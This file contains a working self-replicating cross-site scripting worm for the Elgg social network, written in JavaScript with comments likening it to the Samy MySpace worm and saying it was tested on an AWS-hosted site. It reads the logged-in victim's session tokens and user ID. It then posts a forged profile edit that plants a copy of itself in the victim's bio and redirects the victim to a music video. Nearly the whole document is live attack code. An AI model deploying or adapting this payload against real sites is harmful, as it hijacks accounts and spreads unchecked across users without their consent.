<!-- a simple cross-site scripting social media worm that I tested on a site that used Elgg and was running on an Amazon Web Service instance -->
<!-- similar to the MySpace Samy XSS worm -->
<script id="worm" type="text/javascript">
  var headerTag = '<script id="worm" type="text/javascript">';
  var jsCode = document.getElementById("worm").innerHTML;
  var tailTag = "</" + "script>";
  var wormCode = encodeURIComponent(headerTag + jsCode + tailTag); // for self-replication

  window.onload = function() {
    var userName = elgg.session.user.name; // obtain the username of the logged in user
    var guid = "&guid=" + elgg.session.user.guid; // obtain the guid of the logged in user
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts; // obtain the time stamp security token generated by elgg
    var token = "__elgg_token=" + elgg.security.token.__elgg_token; // obtain the other security token generated by elgg

    // construct the url content
    var content =
      token +
      ts +
      "&name=" +
      userName +
      "&description=<p>stream all i want for Christmas is you by mariah carey</p>" + // the new content of the victim's profile page bio
      wormCode +
      "&accesslevel[description]=2&briefdescription=&accesslevel[briefdescription]=2&location=&accesslevel[location]=2&interests=&accesslevel[interests]=2&skills=&accesslevel[skills]=2&contactemail=&accesslevel[contactemail]=2&phone=&accesslevel[phone]=2&mobile=&accesslevel[mobile]=2&website=&accesslevel[website]=2&twitter=&accesslevel[twitter]=2" +
      guid;
    var sendurl = "/action/profile/edit"; // appropriate path determined by inspecting HTTP request headers
    // var myGuid = // find out my own ID so I don't attack myself. Discovered by inspecting HTTP request headers

    // if(elgg.session.user.guid != myGuid) { // to prevent me from hacking myself
    window.location.replace("https://www.youtube.com/watch?v=yXQViqx6GMY"); // redirect page to the All I Want For Christmas Is You music video lol
    // Create and send Ajax request to modify profile
    var Ajax = null;
    Ajax = new XMLHttpRequest();
    Ajax.open("POST", sendurl, true);
    Ajax.setRequestHeader("Host", ""); // site should be the 2nd argument. I used an AWS instance to test this worm
    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    Ajax.send(content);
    // }
  };
</script>
